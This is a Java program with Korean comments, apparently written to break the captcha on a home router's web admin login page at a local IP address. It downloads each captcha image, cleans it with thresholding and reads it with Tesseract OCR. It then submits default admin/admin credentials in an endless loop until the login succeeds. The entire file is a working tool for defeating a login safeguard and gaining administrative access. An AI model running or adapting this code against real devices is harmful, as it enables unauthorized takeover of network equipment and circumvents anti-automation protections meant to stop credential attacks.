import net.sourceforge.tess4j.Tesseract;
import net.sourceforge.tess4j.util.ImageHelper;
import javax.imageio.ImageIO;
import java.awt.Color;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.CookieManager;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AutoCaptchaBreaker {
    public static void main(String[] args) {
        String targetIp = "192.168.40.1";

        // 세션 유지를 위한 클라이언트 설정
        CookieManager cookieManager = new CookieManager();
        HttpClient client = HttpClient.newBuilder()
                .cookieHandler(cookieManager)
                .build();

        int attempt = 1;
        while (true) {
            System.out.println("\n[시도 " + attempt + "] 캡차 브레이킹 시작...");

            try {
                // 1. 캡차 제어 HTML 수신 및 ID 추출
                HttpRequest getHtml = HttpRequest.newBuilder().uri(URI.create("http://" + targetIp + "/sess-bin/captcha.cgi")).GET().build();
                String htmlBody = client.send(getHtml, HttpResponse.BodyHandlers.ofString()).body();

                Pattern p = Pattern.compile("name=captcha_file value=([a-zA-Z0-9]+)");
                Matcher m = p.matcher(htmlBody);
                if (!m.find()) {
                    System.err.println("[!] ID 추출 실패. 1초 후 재시도...");
                    Thread.sleep(1000);
                    continue;
                }
                String captchaId = m.group(1);

                // 2. 이미지 다운로드
                String imgUrl = "http://" + targetIp + "/captcha/" + captchaId + ".gif";
                HttpResponse<InputStream> imgRes = client.send(HttpRequest.newBuilder().uri(URI.create(imgUrl)).GET().build(),
                        HttpResponse.BodyHandlers.ofInputStream());

                File imgFile = new File("captcha.gif");
                try (InputStream is = imgRes.body(); FileOutputStream fos = new FileOutputStream(imgFile)) {
                    is.transferTo(fos);
                }

                // 3. 이미지 보정 (물결선 제거를 위한 강한 이진화)
                BufferedImage rawImage = ImageIO.read(imgFile);
                BufferedImage resized = ImageHelper.getScaledInstance(rawImage, rawImage.getWidth() * 3, rawImage.getHeight() * 3);

                // 임계값을 140~170 사이로 조정하며 물결선이 사라지는 지점을 찾습니다.
                BufferedImage binarized = new BufferedImage(resized.getWidth(), resized.getHeight(), BufferedImage.TYPE_BYTE_BINARY);
                for (int y = 0; y < resized.getHeight(); y++) {
                    for (int x = 0; x < resized.getWidth(); x++) {
                        Color c = new Color(resized.getRGB(x, y));
                        int brightness = (c.getRed() + c.getGreen() + c.getBlue()) / 3;
                        // 물결선은 보통 글자보다 연합니다. 170 이상으로 높이면 연한 선은 흰색이 됩니다.
                        binarized.setRGB(x, y, (brightness > 175 ? Color.WHITE.getRGB() : Color.BLACK.getRGB()));
                    }
                }

                // 4. OCR 판독
                Tesseract tesseract = new Tesseract();
                String projectRoot = System.getProperty("user.dir");
                tesseract.setDatapath(Paths.get(projectRoot, "src", "main", "resources").toString());
                tesseract.setLanguage("eng");
                tesseract.setVariable("tessedit_char_whitelist", "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789");
                tesseract.setPageSegMode(7);

                String result = tesseract.doOCR(binarized).trim().replaceAll("\\s+", "");
                System.out.println(">> [판독 결과]: [" + result + "]");

                if (result.length() < 3) {
                    System.out.println("[-] 판독값이 너무 짧음. 재시도...");
                    continue;
                }

                // 5. 로그인 시도 및 로그 출력
                String loginUrl = "http://" + targetIp + "/sess-bin/login_handler.cgi";
                String payload = "username=admin&passwd=admin&init_status=1&captcha_on=1" +
                        "&captcha_file=" + captchaId + "&captcha_code=" + result;

                HttpRequest loginReq = HttpRequest.newBuilder()
                        .uri(URI.create(loginUrl))
                        .header("Content-Type", "application/x-www-form-urlencoded")
                        .header("Referer", "http://" + targetIp + "/")
                        .POST(HttpRequest.BodyPublishers.ofString(payload))
                        .build();

                System.out.println(">> [SENDING PAYLOAD]: " + payload);
                HttpResponse<String> loginRes = client.send(loginReq, HttpResponse.BodyHandlers.ofString());
                String resBody = loginRes.body();

                System.out.println("<< [RESPONSE]: " + (resBody.length() > 100 ? resBody.substring(0, 100) : resBody));

                if (resBody.contains("timepro.cgi") || resBody.contains("main.cgi")) {
                    System.out.println("\n[★최종 성공★] " + attempt + "번의 시도 끝에 로그인에 성공했습니다!");
                    break; // 무한 루프 탈출
                } else {                    System.out.println("[-] 로그인 실패. 0.5초 후 다음 이미지로 시도합니다.");
                    attempt++;
                    Thread.sleep(500);
                }

            } catch (Exception e) {
                System.err.println("[!] 에러 발생: " + e.getMessage());
                attempt++;
            }
        }
    }
}